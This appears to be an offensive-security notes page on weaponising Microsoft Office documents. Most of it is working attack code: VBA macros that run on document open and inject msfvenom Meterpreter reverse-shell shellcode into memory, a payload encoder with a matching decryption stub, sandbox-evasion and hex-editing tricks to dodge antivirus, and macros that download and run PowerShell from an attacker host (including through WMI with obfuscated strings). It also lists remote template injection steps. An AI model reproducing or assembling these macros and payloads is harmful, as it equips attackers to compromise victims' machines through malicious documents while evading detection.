---
layout:     post
author:     0x5c4r3
type: docs
permalink: Office_Shellcode_In_Memory
---


<span style="font-size: 35px; color:red"><b>VBA Shellcode Runner </b></span>
&nbsp;
Code to run shell in memory within a Word process

Create the revshell payload to copy in _buf_.
Remember that Word 2016 is a <span style="color:red">32-bit</span> process (encode the payload as x86)..
```shell
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f vbapplication
```

```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = <code_from_MSFVenom> ' It should be something like Array(232,130...)
    
			' VirtualAlloc(address, size, allocation type, protections/permissions)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40) 'to allocate memory that is writable, readable and executable.
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
		        'RtlMoveMemory(buffer, address, length)
        res = RtlMoveMemory(addr + counter, data, 1) 'to move the shellcode in the portion of memory just created. 
    Next counter
		    'CreateThread(0, 0, start_address for code execution, 0, 0, 0)
    res = CreateThread(0, 0, addr, 0, 0, 0) 'to create the thread that runs the code
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Encrypted VBA Shellcode Runner</b></span>

Helper to encrypt the original payload from MSFVenom:
```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[794] {0xfc,0x48,0x83,0xe4,0xf0,0xe8, //Change here

			 byte[] encoded = new byte[buf.Length];
			   for(int i = 0; i < buf.Length; i++)
			   {
			     encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
			   }
 
			   uint counter = 0;
 
			   StringBuilder hex = new StringBuilder(encoded.Length * 2);
			   foreach(byte b in encoded)
			   {
					hex.AppendFormat("{0:D}, ", b);
					counter++;
				    if(counter % 50 == 0)
					{
						hex.AppendFormat("_{0}", Environment.NewLine);
					}
				}
			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

It will output a shellcode to input to the file below:
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long


Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

	Dim t1 As Date
	Dim t2 As Date
	Dim time As Long

	t1 = Now()
	Sleep (2000)
	t2 = Now()
	time = DateDiff("s", t1, t2)

	If time < 2 Then
	    Exit Function
	End If
    
    buf = <code_from_MSFVenom> ' It should be something like Array(232,130...) coming from the script above.

	For i = 0 To UBound(buf) 'decryption routine
	    buf(i) = buf(i) - 2
	Next i
	
			' VirtualAlloc(address, size, allocation type, protections/permissions)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40) 'to allocate memory that is writable, readable and executable.
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
		        'RtlMoveMemory(buffer, address, length)
        res = RtlMoveMemory(addr + counter, data, 1) 'to move the shellcode in the portion of memory just created. 
    Next counter
		    'CreateThread(0, 0, start_address for code execution, 0, 0, 0)
    res = CreateThread(0, 0, addr, 0, 0, 0) 'to create the thread that runs the code
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
You can reduce detection even more if you open the file withn a tool like FlexHEX and:
- Go into PROJECT and remove "Module=NewMacros", replacing it with Zero Blocks (underline the part and _Edit_ > _Insert Zero Block_)
- Close and reopen
- Open NewMacros and do the same for the block from "Attribute VB_Name=.........." to the very last byte.

&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Powershell Shellcode Runner From VBA</b></span>

Remember that Powershell is a <span style="color:red">64-bit</span> process (encode the payload as x64).
Reverse shell to embed in .ps1 that runs directly in ram.
```powershell
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 EXITFUNC=thread -f ps1
```
run.ps1 to call from VBA
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60... 'stuff here

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Macro to create calling the ps1 above:
```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

OR you can try:
```vb
Sub MyMacro()
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://<ATTACKER_IP>/run.txt'))"
  Shell strArg, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Powershell Shellcode Runner Calling WMI (Windows Management Instrumentation Framework)</b></span>
Our goal is to use WMI from VBA to create a PowerShell process instead of having it as a child process of Microsoft Word. The Macro does not even use the _Shell_ function.

```vb
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://<ATTACKER_IP>/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

Even better if we obfuscate the code using:
```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://<ATTACKER_IP>/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output
```
The output will be something like: `16253714276124...`
Use the above script to:
- encrypt the payload and replace it in the below script
- encrypt the name of the DOCUMENT you download (runner.doc) and replace it in the script below

```vb
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String

	If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then 'replace the numbers with the encrypted version of the NAME OF THE DOCUMENT.doc'
	  Exit Function
	End If
	
    Apples = "129128136118131132121118....." 'change here with payload
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
	MyMacro
End Sub
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Remote Template Injection</b></span>
You can create a normal document <span style="color:red">.docx</span> and point it to use an arbitrary template <span style="color:red">.dot</span> that contains a malicious macro.
- Create the .dot containing the malicious macro and host it on a website to then download.
- Create the .docx with whatever.
- Open the .docx with <span style="color:red">7z</span> and navigate into <span style="color:red">_rels/settings.xml.rels</span> and select edit.
- Scroll and change the Target="something" with Target="<URL_TO_FILE.dot>"
- &nbsp;
Consider using [remoteInjector.py](https://github.com/JohnWoodman/remoteinjector) to automate the process.
